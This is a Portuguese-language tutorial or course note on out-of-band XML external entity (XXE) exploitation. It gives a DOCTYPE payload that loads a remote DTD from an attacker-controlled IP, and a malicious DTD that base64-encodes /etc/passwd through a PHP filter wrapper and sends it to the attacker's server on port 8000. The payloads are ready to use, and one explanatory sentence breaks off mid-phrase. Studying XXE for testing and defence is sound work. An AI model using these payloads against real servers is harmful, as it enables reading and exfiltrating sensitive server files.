
XXE OOB é uma técnica especifica para explorar XXE, ocorre quando uma aplicação processa um arquivo XML de maneira insegura e permite que um atacante faça a requisição de uma entidade externa, mas ao invés de retornar a resposta diretamente, o servidor envia os dados para um destino externo controlado pelo atacante.

Enviando o payload abaixo podemos ver que nosso XML é processado pelo servidor e a requisição é feita no nosso servidor:
![[Captura de tela de 2025-07-02 10-39-41.png]]
Também é possível enviar esse payload sem que seja necessário o processamento do campo do nosso XML, adicionando ele no campo das entidades %file, podemos usar em cenários onde não conseguimos alterar o corpo do XML.

Utilizando um **%** em uma entidade que faz a requisição, o seu resultado se torna um parâmetro e não um valor de entidade, então oque podemos fazer é chamar um XML remotamente, pegar o resultado desse XML e colocar dentro da área de entidades
```
<!DOCTYPE xxeoob
[
<!ENTITY % file SYSTEM "http://10.0.23.219/data.dtd"
%file;
]
>
<root>testes</root>
```

Para aumentar o impacto dessa falha podemos tentar ler arquivos sensíveis do servidor. Para isso vamos criar um arquivo .dtd na nossa máquina e dentro dele vamos criar três entidades, a primeira vai utilizar PHP wrapper para encodar o conteúdo do arquivo que vamos ler em base64, a segunda vai concatenar dois valores o resultado da primeira entidade com 
``` cat aula.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.0.23.219:8000/?leak=%file;'>">
%payload;
%remote;
```
A entidade **payload** vai ter outra entidade dentro dela com o objetivo de concatenar valores. Quando essa entidade for executada ela vai fazer uma chamada para meu servidor externo enviando o arquivo de /etc/passwd em base64.
O **&#37**  é o % pois dentro de uma entidade que está dentro de outra entidade todo caractere já reservado de uma entidade precisa passar por um processo de html encode numérico.
	https://gchq.github.io/CyberChef/

Oque está sendo feito é que a entidade **file** está indo no nosso servidor pegando o arquivo **data.dtd** e processando o conteúdo dele e retornando nos retornado em base64.